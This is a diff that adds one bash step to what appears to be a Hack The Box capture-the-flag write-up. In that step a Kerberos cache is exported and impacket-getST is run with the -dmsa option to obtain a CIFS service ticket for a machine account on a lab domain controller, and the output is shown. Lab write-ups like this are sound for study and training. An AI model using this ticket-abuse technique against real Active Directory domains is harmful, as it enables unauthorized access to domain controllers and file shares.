@@ -1129,3 +1129,17 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 ╰─                                                                                                               ─╯
 
 ```
+
+``` bash
+
+❯ export KRB5CCNAME=alex.turner.ccache
+
+❯ impacket-getST -dc-ip 10.129.113.22 -spn 'cifs/dc01.checkpoint.htb' 'checkpoint.htb/svc_pwn$' -k -no-pass -dmsa
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Getting ST for user
+[*] Saving ticket in svc_pwn$@cifs_dc01.checkpoint.htb@CHECKPOINT.HTB.ccache
+╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                 ✔ ─╮
+╰─                                                                                                               ─╯
+
+```
